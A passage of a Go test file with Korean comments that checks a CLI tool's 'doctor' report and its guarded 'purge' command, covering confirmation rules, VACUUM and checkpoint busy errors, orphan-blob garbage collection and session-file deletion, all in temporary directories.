// 없으면(usable=0) [15]는 버킷 분해 없이 '세션 분해 없음' 폴백으로 렌더한다(runDoctor의 usable=0 분기).
func TestDoctorShadowOwnedNoSessionDecomp(t *testing.T) {
	isolateCodexHome(t)
	storeRoot, projectRoot, projDir := doctorShadowProjDir(t)
	seedShadowContentDB(t, projDir) // worktrees 디렉터리 미생성 → usable=0

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	out := buf.String()
	if !strings.Contains(out, "[15] shadow-owned: ") || !strings.Contains(out, "(세션 분해 없음)") || !strings.Contains(out, "hashes=1") {
		t.Fatalf("세션 분해 없음 폴백 형식 아님:\n%s", out)
	}
	if strings.Contains(out, "cc:=") { // 폴백 경로엔 버킷 분해가 없어야 한다
		t.Fatalf("폴백인데 버킷 분해 병기:\n%s", out)
	}
}

// TestRun_UnknownSub: cli의 관심사가 아닌 미지 서브커맨드는 오류를 반환해야 한다 — main이
// 이를 통해 미지 단어를 MCP 플래그로 잘못 흡수하지 않도록 한다(설계 §7).
func TestRun_UnknownSub(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "bogus", nil, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for unknown subcommand, got nil")
	}
}

// TestRunPurge_ExactlyOneSelector: --project/--all 중 정확히 하나가 아니면 사용법 오류(설계
// §7). Run을 통해 호출해 dispatch까지 포함해 확인한다 — 비TTY(테스트 프로세스 stdin)라
// --force 미비로도 오류가 나겠지만, 이 값 자체는 selector 검증이 먼저 걸려야 한다.
func TestRunPurge_ExactlyOneSelector(t *testing.T) {
	for _, args := range [][]string{
		{},                          // 둘 다 없음
		{"--project", "x", "--all"}, // 둘 다 있음
	} {
		var out, errOut bytes.Buffer
		err := Run(context.Background(), "purge", args, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
		if err == nil {
			t.Fatalf("args=%v: want selector 오류, got nil", args)
		}
	}
}

// TestRunPurge_OlderThanRejectsInvalidDuration: 리뷰 P2-1(Fix Round 1) — 파싱 자체가
// 실패하는 값("abc")뿐 아니라 파싱은 성공하지만 음수·0인 값("-1h","0s")도 거부해야 한다.
// storeRoot가 비어 있어도(프로젝트 미등록) 이 검증은 프로젝트 존재 확인보다 먼저 걸린다.
func TestRunPurge_OlderThanRejectsInvalidDuration(t *testing.T) {
	for _, v := range []string{"-1h", "0s", "abc"} {
		var out bytes.Buffer
		args := []string{"--project", "whatever-id", "--force", "--older-than", v}
		if err := runPurge(context.Background(), failReader{}, &out, io.Discard, t.TempDir(), args, false); err == nil {
			t.Fatalf("older-than=%q: want error, got nil", v)
		}
	}
}

// TestRunPurge_PhantomProjectRejected: 리뷰 P2-2(Fix Round 1) — 존재하지 않는 프로젝트 ID로
// --older-than(선택 삭제 경로)을 호출하면 store.Open(dir,false)이 그 자리에서 새 프로젝트를
// 만들어버리기 전에 오류로 거부해야 하고, projects/ 하위에 그 이름의 디렉터리가 생기면 안
// 된다(phantom 생성 방지).
func TestRunPurge_PhantomProjectRejected(t *testing.T) {
	storeRoot := t.TempDir()
	var out bytes.Buffer
	args := []string{"--project", "does-not-exist-id", "--force", "--older-than", "1h"}
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err == nil {
		t.Fatal("want error for nonexistent project, got nil")
	}
	if _, err := os.Stat(filepath.Join(storeRoot, "projects", "does-not-exist-id")); !os.IsNotExist(err) {
		t.Fatalf("phantom project directory was created: stat err=%v", err)
	}
}

// TestRunPurge_VacuumComboStaticErrors — D50 정적 검증: --vacuum은 --older-than 결합 전용이며
// 판정은 기존 XOR·--hook-only 조기 분기보다 앞선다(오류 우선순위 명문 — 스펙 §0). 부작용 0
// (projects/ 미생성) 단정 포함.
func TestRunPurge_VacuumComboStaticErrors(t *testing.T) {
	cases := []struct {
		name, wantMsg string
		args          []string
	}{
		{"단독", "--older-than", []string{"--project", "px", "--vacuum"}},
		{"gc만", "--older-than", []string{"--project", "px", "--gc", "--vacuum"}},
		{"sessions만", "--older-than", []string{"--project", "px", "--sessions", "--vacuum"}},
		{"hook-only", "상시 VACUUM", []string{"--project", "px", "--hook-only", "--vacuum"}},
		{"hook-only+older-than", "상시 VACUUM", []string{"--project", "px", "--hook-only", "--older-than", "1h", "--vacuum"}},
		{"전체삭제", "--older-than", []string{"--project", "px", "--force", "--vacuum"}},
		{"선택자없음(XOR보다 우선)", "--older-than", []string{"--vacuum"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			storeRoot := t.TempDir()
			var out bytes.Buffer
			err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, c.args, false)
			if err == nil || !strings.Contains(err.Error(), c.wantMsg) {
				t.Fatalf("err=%v want substring %q", err, c.wantMsg)
			}
			if _, statErr := os.Stat(filepath.Join(storeRoot, "projects")); !errors.Is(statErr, os.ErrNotExist) {
				t.Fatalf("정적 오류인데 projects/ 생성됨(부작용): %v", statErr)
			}
		})
	}
}

// TestPurgeProjectID_StoreIDNotShadowedByCwdDir: 리뷰 P2-3(Fix Round 1) — cwd에 store
// ProjectID와 동명의 디렉터리가 우연히 있어도 --project <id>는 store 쪽 프로젝트를 대상으로
// 삼아야 한다(예전 로직은 "구분자 없고 cwd에 동명 디렉터리 존재"를 경로로 오인해
// ident.Canonicalize(그 cwd 디렉터리)로 완전히 다른 ID를 계산해버렸다).
func TestPurgeProjectID_StoreIDNotShadowedByCwdDir(t *testing.T) {
	storeRoot := t.TempDir()
	registeredRoot := t.TempDir()
	canon, err := ident.Canonicalize(registeredRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	id := canon.ProjectID
	st, err := store.Open(filepath.Join(storeRoot, "projects", id), false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	cwdBase := t.TempDir()
	if err := os.MkdirAll(filepath.Join(cwdBase, id), 0o755); err != nil {
		t.Fatal(err)
	}
	origWD, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(cwdBase); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chdir(origWD) })

	got, err := purgeProjectID(storeRoot, id)
	if err != nil {
		t.Fatalf("purgeProjectID: %v", err)
	}
	if got != id {
		t.Fatalf("got=%q want %q (store ID가 cwd 동명 디렉터리에 가려짐)", got, id)
	}
}

// failReader: Read 호출 시 즉시 panic — confirmPurge의 force 경로가 실제로 in을 전혀 읽지
// 않음을 증명하는 용도(읽으면 테스트가 panic으로 즉시 실패한다).
type failReader struct{}

func (failReader) Read([]byte) (int, error) {
	panic("confirmPurge: force 경로에서 입력을 읽으면 안 됩니다")
}

// TestConfirmPurge: 확인 규칙 table-driven(설계 §7 — TTY 필수+슬러그 정확 입력, 정적 "yes"
// 금지, 비TTY는 --force만). confirmPurge는 순수 함수라 os.Stdin 없이 직접 호출한다.
func TestConfirmPurge(t *testing.T) {
	tests := []struct {
		name    string
		in      io.Reader
		isTTY   bool
		force   bool
		wantErr bool
	}{
		{"tty_exact_slug_ok", strings.NewReader("myproj\n"), true, false, false},
		{"tty_wrong_input_rejected", strings.NewReader("nope\n"), true, false, true},
		{"tty_static_yes_rejected", strings.NewReader("yes\n"), true, false, true},
		{"non_tty_without_force_rejected", failReader{}, false, false, true},
		{"non_tty_with_force_ok_and_unread", failReader{}, false, true, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var out bytes.Buffer
			err := confirmPurge(tt.in, &out, tt.isTTY, tt.force, "전체 삭제는 세션 이벤트 데이터를 포함합니다", "myproj")
			if (err != nil) != tt.wantErr {
				t.Fatalf("err=%v wantErr=%v", err, tt.wantErr)
			}
		})
	}
}

// TestPurgeSessionFiles_SkipsWhenLeaseHeld — 최종리뷰 B1(Codex P1): 서버가 shared lease를
// 보유 중인 worktree는 purge --sessions가 삭제하지 않고 스킵 + stderr 고지한다(unlink-while-open
// 유실·recover 경합 방어). exclusive AcquireLock이 shared 보유와 경합해 즉시 실패하는 것을 이용.
func TestPurgeSessionFiles_SkipsWhenLeaseHeld(t *testing.T) {
	storeRoot := t.TempDir()
	projDir := filepath.Join(storeRoot, "projects", "proj-b1")
	st, err := store.Open(projDir, false) // content.db 생성(purge 대상 실재 판정 통과)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("store.Close: %v", err)
	}
	wtDir := filepath.Join(projDir, "worktrees", "wt-b1")
	sess, err := session.Open(wtDir, session.Options{Producer: "context-router/test"}) // shared lease 보유
	if err != nil {
		t.Fatalf("session.Open: %v", err)
	}
	defer func() { _ = sess.Close() }()

	var out, errOut bytes.Buffer
	args := []string{"--project", "proj-b1", "--sessions", "--force"}
	if err := runPurge(context.Background(), failReader{}, &out, &errOut, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge err=%v", err)
	}
	if _, statErr := os.Stat(filepath.Join(wtDir, "session.db")); statErr != nil {
		t.Fatalf("session.db should remain (lease held → skip), stat err=%v", statErr)
	}
	if !strings.Contains(errOut.String(), "skip worktree") {
		t.Fatalf("stderr missing skip notice: %q", errOut.String())
	}
}

// TestRunPurge_E2E_OlderThanForce: 임시 store에 source 1건을 등록한 뒤 runPurge를
// --project(경로 형태, purgeProjectID의 Canonicalize 분기까지 exercised) --force
// --older-than 1ns로 호출한다. isTTY는 false로 명시 주입한다 — 이 값은 원래 Run()의 purge
// 분기가 os.Stdin.Stat()으로 판정하지만(테스트 대상 아님, 한 줄짜리 위임), 테스트 프로세스의
// 실제 stdin이 셸/CI 환경에 따라 문자 장치로 보일 수도 있어(이식성 없음) runPurge를 직접
// 호출해 비TTY 경로를 결정적으로 재현한다. 삭제 후 sources/artifacts가 실제로 비어야 한다
// (설계 §7 선택 삭제).
func TestRunPurge_E2E_OlderThanForce(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte("purge me"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/purge.txt", Kind: "file", SrcHash: "h-purge"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "purge me"}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	time.Sleep(1100 * time.Millisecond) // indexed_at은 unix 초 — --older-than 1ns가 실제로 경계를 넘도록

	var out bytes.Buffer
	args := []string{"--project", projectRoot, "--force", "--older-than", "1ns"}
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge err=%v out=%s", err, out.String())
	}

	st2, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	defer st2.Close()
	var n int
	if err := st2.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 0 {
		t.Fatalf("sources=%d want 0(삭제됐어야 함)", n)
	}
	if err := st2.Reader().QueryRow("SELECT count(*) FROM artifacts").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 0 {
		t.Fatalf("artifacts=%d want 0(삭제됐어야 함)", n)
	}
}

// seedVacuumProject — D50 테스트 공용: ~256KB 청크를 등록해 삭제 후 VACUUM 회수가 실측
// 가능한 프로젝트를 만든다. indexed_at 경계(unix 초) 때문에 1100ms 대기까지 포함한다.
func seedVacuumProject(t *testing.T, storeRoot string) (projectRoot, projDir string) {
	t.Helper()
	projectRoot = t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir = filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	big := strings.Repeat("v", 256*1024)
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte(big), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/vac.txt", Kind: "file", SrcHash: "h-vac"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: big}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	time.Sleep(1100 * time.Millisecond)
	return projectRoot, projDir
}

// contentFootprintOf — 테스트측 총합 실측(구현 헬퍼와 독립 계산 — 동일 값 검증이 목적이므로
// 구현을 import하지 않고 재계산한다).
func contentFootprintOf(t *testing.T, projDir string) int64 {
	t.Helper()
	var total int64
	for _, suf := range []string{"", "-wal", "-shm"} {
		if fi, err := os.Stat(filepath.Join(projDir, "content.db"+suf)); err == nil {
			total += fi.Size()
		}
	}
	return total
}

// TestRunPurge_E2E_OlderThanVacuum — D50 정상 경로: 총합(db+wal+shm) 전>후 + 보고 라인 +
// rc=0. main 파일 단독 크기 단정은 하지 않는다(WAL 가변성 — 스펙 §2).
func TestRunPurge_E2E_OlderThanVacuum(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot, projDir := seedVacuumProject(t, storeRoot)
	before := contentFootprintOf(t, projDir)

	var out bytes.Buffer
	args := []string{"--project", projectRoot, "--force", "--older-than", "1ns", "--vacuum"}
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge err=%v out=%s", err, out.String())
	}
	if !strings.Contains(out.String(), "파일 축 회수") {
		t.Fatalf("회수 보고 라인 없음:\n%s", out.String())
	}
	after := contentFootprintOf(t, projDir)
	if after >= before {
		t.Fatalf("총합 %dB→%dB — 감소해야 함", before, after)
	}
}

// TestVacuumReclaimBusyMapsToGuidance — D50: VACUUM 자체가 BUSY로 실패하는 경로(final review I1의
// 결정 재현 가능 부분)의 "라이브 프로세스" 매핑을 직접 단정한다. 별도 연결 BEGIN IMMEDIATE 선점
// 상태에서 vacuumReclaim을 직접 호출 — busy_timeout 소진 ~5s 정상. disk 계열(SQLITE_FULL)은
// 결정 재현 불가로 미커버(문서화된 갭).
func TestVacuumReclaimBusyMapsToGuidance(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	defer func() { _ = st.Close() }()
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte("busy"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/busy.txt", Kind: "file", SrcHash: "h-vrb"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "busy"}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	dbPath := filepath.ToSlash(filepath.Join(projDir, "content.db"))
	locker, err := sql.Open("sqlite", "file:"+dbPath+"?_pragma=busy_timeout(1000)")
	if err != nil {
		t.Fatalf("open locker: %v", err)
	}
	defer func() { _ = locker.Close() }()
	conn, err := locker.Conn(context.Background())
	if err != nil {
		t.Fatalf("locker conn: %v", err)
	}
	defer func() { _ = conn.Close() }()
	if _, err := conn.ExecContext(context.Background(), "BEGIN IMMEDIATE"); err != nil {
		t.Fatalf("BEGIN IMMEDIATE: %v", err)
	}
	var out bytes.Buffer
	verr := vacuumReclaim(context.Background(), st, projDir, contentFootprintOf(t, projDir), &out)
	_, _ = conn.ExecContext(context.Background(), "ROLLBACK")
	if verr == nil || !strings.Contains(verr.Error(), "VACUUM 경합") || !strings.Contains(verr.Error(), "라이브 프로세스") {
		t.Fatalf("verr=%v want VACUUM 경합·라이브 프로세스 매핑", verr)
	}
	if out.Len() != 0 {
		t.Fatalf("실패 경로인데 보고 출력 존재: %q", out.String())
	}
}

// TestRunPurge_VacuumCheckpointBusyMapsToError — D50: 열린 read 트랜잭션 공존 시 삭제·VACUUM은
// 통과해도 checkpoint busy≠0 → "라이브 프로세스" 오류로 표면화(무성 성공 위장 봉쇄 — 스펙 §5
// Codex 실험 시나리오). 삭제분 유지·quick_check=ok 단정 포함. busy_timeout 탓 ~5s 정상.
func TestRunPurge_VacuumCheckpointBusyMapsToError(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot, projDir := seedVacuumProject(t, storeRoot)

	dbPath := filepath.ToSlash(filepath.Join(projDir, "content.db"))
	locker, err := sql.Open("sqlite", "file:"+dbPath+"?_pragma=busy_timeout(1000)")
	if err != nil {
		t.Fatalf("open locker: %v", err)
	}
	defer func() { _ = locker.Close() }()
	conn, err := locker.Conn(context.Background())
	if err != nil {
		t.Fatalf("locker conn: %v", err)
	}
	defer func() { _ = conn.Close() }()
	if _, err := conn.ExecContext(context.Background(), "BEGIN"); err != nil {
		t.Fatalf("BEGIN: %v", err)
	}
	var pin int
	if err := conn.QueryRowContext(context.Background(), "SELECT count(*) FROM sources").Scan(&pin); err != nil {
		t.Fatalf("read txn: %v", err)
	}

	var out bytes.Buffer
	var errOut bytes.Buffer
	args := []string{"--project", projectRoot, "--force", "--older-than", "1ns", "--vacuum"}
	rc := runPurge(context.Background(), failReader{}, &out, &errOut, storeRoot, args, false)
	_, _ = conn.ExecContext(context.Background(), "ROLLBACK")
	if rc == nil || !strings.Contains(rc.Error(), "VACUUM/checkpoint 실패") {
		t.Fatalf("rc=%v want 집계 오류", rc)
	}
	if !strings.Contains(errOut.String(), "라이브 프로세스") {
		t.Fatalf("busy 안내 없음:\n%s", errOut.String())
	}
	st, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	defer func() { _ = st.Close() }()
	var n int
	if err := st.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 0 {
		t.Fatalf("sources=%d want 0 — checkpoint 실패가 삭제를 되돌리면 안 됨", n)
	}
	var qc string
	if err := st.Reader().QueryRow("PRAGMA quick_check").Scan(&qc); err != nil || qc != "ok" {
		t.Fatalf("quick_check=%q err=%v want ok(무손상)", qc, err)
	}
}

// TestRunPurge_All_VacuumAggregateExit — D50 --all 집계: 한 프로젝트 checkpoint busy 실패,
// 다른 프로젝트 정상 → 정상 프로젝트 회수 라인은 출력되고(계속 진행) 최종 rc는 비-zero(집계).
// 순회 순서 무가정 단정. ~5s 정상.
func TestRunPurge_All_VacuumAggregateExit(t *testing.T) {
	storeRoot := t.TempDir()
	_, projDirA := seedVacuumProject(t, storeRoot)
	seedVacuumProject(t, storeRoot) // B: 정상

	dbPath := filepath.ToSlash(filepath.Join(projDirA, "content.db"))
	locker, err := sql.Open("sqlite", "file:"+dbPath+"?_pragma=busy_timeout(1000)")
	if err != nil {
		t.Fatalf("open locker: %v", err)
	}
	defer func() { _ = locker.Close() }()
	conn, err := locker.Conn(context.Background())
	if err != nil {
		t.Fatalf("locker conn: %v", err)
	}
	defer func() { _ = conn.Close() }()
	if _, err := conn.ExecContext(context.Background(), "BEGIN"); err != nil {
		t.Fatalf("BEGIN: %v", err)
	}
	var pin int
	if err := conn.QueryRowContext(context.Background(), "SELECT count(*) FROM sources").Scan(&pin); err != nil {
		t.Fatalf("read txn: %v", err)
	}

	var out, errOut bytes.Buffer
	args := []string{"--all", "--force", "--older-than", "1ns", "--vacuum"}
	rc := runPurge(context.Background(), failReader{}, &out, &errOut, storeRoot, args, false)
	_, _ = conn.ExecContext(context.Background(), "ROLLBACK")
	if rc == nil || !strings.Contains(rc.Error(), "1개 프로젝트 VACUUM/checkpoint 실패") {
		t.Fatalf("rc=%v want 집계 1개 실패", rc)
	}
	if !strings.Contains(out.String(), "파일 축 회수") {
		t.Fatalf("정상 프로젝트 회수 라인 없음(계속 진행 계약 위반):\n%s", out.String())
	}
}

// TestRunPurge_E2E_MismatchLeavesDataIntact: TTY 경로에서 확인 슬러그를 잘못 입력하면
// runPurge가 오류를 반환하고 sources/artifacts를 전혀 건드리면 안 된다(설계 §7 — 불일치 시
// 무삭제, self-review 필수 항목). --older-than을 지정하지 않아 전체 삭제(RemoveAll) 분기까지
// 타는 경우도 포함 — 확인 실패 시 그 분기 자체에 도달하면 안 된다는 것까지 증명한다.
func TestRunPurge_E2E_MismatchLeavesDataIntact(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte("do not touch"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/keep.txt", Kind: "file", SrcHash: "h-keep"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "do not touch"}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	var out bytes.Buffer
	args := []string{"--project", canon.ProjectID} // --older-than 미지정 → 성공했다면 전체 삭제였을 경로
	err = runPurge(context.Background(), strings.NewReader("wrong-slug\n"), &out, io.Discard, storeRoot, args, true)
	if err == nil {
		t.Fatal("want error for mismatched confirmation slug, got nil")
	}

	if _, err := os.Stat(projDir); err != nil {
		t.Fatalf("projDir must survive a rejected confirmation: %v", err)
	}
	st2, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	defer st2.Close()
	var n int
	if err := st2.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 1 {
		t.Fatalf("sources=%d want 1(무삭제)", n)
	}
}

// TestRunPurge_E2E_GCOnlyNoConfirm: --gc 단독(older-than 없음)이면 --force도 TTY도 없이
// 성공해야 하고(확인 생략, 설계 §7), orphan blob만 지우고 참조 중인 source/artifact/blob은
// 전혀 건드리지 않아야 한다.
func TestRunPurge_E2E_GCOnlyNoConfirm(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	body := []byte("kept content")
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: body, MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/kept.txt", Kind: "file", SrcHash: "h-kept"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: string(body)}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	sum := sha256.Sum256(body)
	keptHash := hex.EncodeToString(sum[:])

	orphanHash := strings.Repeat("e", 64)
	orphanDir := filepath.Join(projDir, "artifacts", orphanHash[:2])
	if err := os.MkdirAll(orphanDir, 0o700); err != nil {
		t.Fatal(err)
	}
	orphanPath := filepath.Join(orphanDir, orphanHash)
	if err := os.WriteFile(orphanPath, []byte("orphan"), 0o600); err != nil {
		t.Fatal(err)
	}
	// store.gcOrphanMinAge(1h) age gate를 통과시킨다(리뷰 P1) — 갓 만든 파일은 GC가
	// 등록 진행 중일 가능성 때문에 건드리지 않는다.
	old := time.Now().Add(-2 * time.Hour)
	if err := os.Chtimes(orphanPath, old, old); err != nil {
		t.Fatal(err)
	}

	var out, errOut bytes.Buffer
	// --force도 --older-than도 없다 — gc 단독이 확인을 생략하고도 성공해야 한다.
	args := []string{"--project", projectRoot, "--gc"}
	if err := Run(context.Background(), "purge", args, storeRoot, projectRoot, "0.0.1-dev", &out, &errOut); err != nil {
		t.Fatalf("Run purge --gc err=%v out=%s", err, out.String())
	}

	if _, err := os.Stat(filepath.Join(orphanDir, orphanHash)); !os.IsNotExist(err) {
		t.Fatalf("orphan blob 잔존: err=%v", err)
	}
	if _, err := os.Stat(filepath.Join(projDir, "artifacts", keptHash[:2], keptHash)); err != nil {
		t.Fatalf("참조 blob이 gc-only에 삭제됨: %v", err)
	}
	st2, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	defer st2.Close()
	var n int
	if err := st2.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 1 {
		t.Fatalf("sources=%d want 1(gc-only는 DB 행을 지우지 않음)", n)
	}
}

// TestRunPurge_SessionsTarget_StandaloneKeepsContentAndBackups: 브리프 Step1 ⑤ — --sessions
// 단독(--older-than 없음)은 session.db 파일 계열(-wal/-shm 포함)만 지우고, content.db
// 데이터·`.bak-<ts>` 파일·session.recover-pending 마커는 건드리지 않는다(설계 §5 명문 계약,
// --gc 단독과 동형인 "세션 단독" 모드).
func TestRunPurge_SessionsTarget_StandaloneKeepsContentAndBackups(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte("keep me"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/keep.txt", Kind: "file", SrcHash: "h-keep-sessions"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "keep me"}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	wtDir := filepath.Join(projDir, "worktrees", "wt1")
	if err := os.MkdirAll(wtDir, 0o700); err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"session.db", "session.db-wal", "session.db-shm"} {
		if err := os.WriteFile(filepath.Join(wtDir, name), []byte("x"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	const backupName = "session.db.bak-20260101T000000Z"
	if err := os.WriteFile(filepath.Join(wtDir, backupName), []byte("backup"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(wtDir, "session.recover-pending"), nil, 0o600); err != nil {
		t.Fatal(err)
	}

	var out bytes.Buffer
	args := []string{"--project", projectRoot, "--force", "--sessions"}
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge err=%v out=%s", err, out.String())
	}

	for _, name := range []string{"session.db", "session.db-wal", "session.db-shm"} {
		if _, statErr := os.Stat(filepath.Join(wtDir, name)); !os.IsNotExist(statErr) {
			t.Fatalf("%s 잔존: err=%v", name, statErr)
		}
	}
	if _, err := os.Stat(filepath.Join(wtDir, backupName)); err != nil {
		t.Fatalf("백업 파일이 삭제됨: %v", err)
	}
	if _, err := os.Stat(filepath.Join(wtDir, "session.recover-pending")); err != nil {
		t.Fatalf("recover-pending 마커가 삭제됨: %v", err)
	}

	st2, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
	defer st2.Close()
	var n int
	if err := st2.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 1 {
		t.Fatalf("sources=%d want 1(세션 단독은 content를 건드리지 않음)", n)
	}
}

// TestRunPurge_SessionsTarget_WithOlderThanAlsoPurgesContent: --sessions와 --older-than을
// 함께 주면 선택 content 삭제(PurgeOlderThan) 뒤에 이어서 session.db 파일 계열도 지운다
// (additive — "기존 purge 의미론에 정합", 브리프 Interfaces 문구).
func TestRunPurge_SessionsTarget_WithOlderThanAlsoPurgesContent(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte("purge me too"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/purge2.txt", Kind: "file", SrcHash: "h-purge-sessions"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "purge me too"}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	time.Sleep(1100 * time.Millisecond) // indexed_at은 unix 초 — --older-than 1ns가 경계를 넘도록

	wtDir := filepath.Join(projDir, "worktrees", "wt1")
	if err := os.MkdirAll(wtDir, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(wtDir, "session.db"), []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}

	var out bytes.Buffer
	args := []string{"--project", projectRoot, "--force", "--older-than", "1ns", "--sessions"}
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge err=%v out=%s", err, out.String())
	}

	if _, err := os.Stat(filepath.Join(wtDir, "session.db")); !os.IsNotExist(err) {
		t.Fatalf("session.db 잔존: err=%v", err)
	}
	st2, err := store.Open(projDir, true)
	if err != nil {
		t.Fatalf("reopen: %v", err)
	}
